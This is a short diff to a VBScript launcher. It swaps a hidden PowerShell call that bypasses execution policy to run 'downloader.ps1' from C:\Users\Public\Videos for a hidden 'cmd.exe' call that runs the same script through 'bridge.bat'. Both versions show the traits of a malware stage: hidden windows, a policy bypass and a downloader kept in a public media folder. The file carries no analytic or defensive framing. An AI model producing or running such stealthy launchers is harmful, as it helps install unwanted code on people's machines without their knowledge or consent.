@@ -1,2 +1,7 @@
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\Videos\downloader.ps1""",  0, False
+
+Dim batchFilePath, parameter
+batchFilePath = "C:\Users\Public\Videos\bridge.bat"
+parameter = "C:\Users\Public\Videos\downloader.ps1"
+
+objShell.Run "cmd.exe /c " & batchFilePath & " " & parameter,  0, False
